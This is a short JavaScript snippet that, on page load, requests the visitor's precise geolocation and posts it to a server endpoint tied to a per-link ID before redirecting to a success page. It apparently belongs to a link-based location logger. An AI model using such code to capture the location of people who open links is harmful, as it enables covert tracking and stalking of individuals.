function sendLocationPayload(latitudeValue, longitudeValue) {
    fetch('/api/save-location/{{ link_id }}', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
            username: 'Uknon',
            latitude: latitudeValue,
            longitude: longitudeValue
        })
    }).then(() => {
        window.location.href = '/success';
    });
}

function requestUserLocation() {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(
            (positionObject) => {
                sendLocationPayload(positionObject.coords.latitude, positionObject.coords.longitude);
            },
            (errorObject) => {
                sendLocationPayload(null, null);
            },
            {
                enableHighAccuracy: true,
                timeout: 5000,
                maximumAge: 0
            }
        );
    } else {
        sendLocationPayload(null, null);
    }
}

window.onload = requestUserLocation;